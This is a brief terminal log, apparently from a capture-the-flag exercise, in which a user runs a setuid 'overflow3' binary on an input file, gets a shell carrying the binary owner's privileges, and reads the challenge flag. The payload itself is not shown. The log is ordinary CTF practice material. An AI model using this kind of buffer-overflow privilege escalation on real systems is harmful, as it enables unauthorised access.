team24254@shell:/problems/overflow3$ ./overflow3 `cat ~/in.txt`

$ id

uid=1028(team24254) gid=1000(ctfgroup) euid=1079(overflow3) groups=1002(overflow3),1000(ctfgroup)

$ ls

Makefile  flag.txt  overflow3  overflow3.c

$ cat flag.txt

shellcode_more_like_hellcode
